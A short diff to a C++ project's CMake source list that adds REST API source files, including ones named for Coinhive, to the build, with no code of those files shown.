@@ -74,6 +74,10 @@ set(sources
     models/boardmodel.h
     models/gamemodel.cpp
     models/gamemodel.h
+    rest_apis/coinhive.cpp
+    rest_apis/coinhive.h
+    rest_apis/restAPIsBase.cpp
+    rest_apis/restAPIsBase.h
     connections/connection.cpp
     connections/connection.h
     connections/connectionfactory.cpp
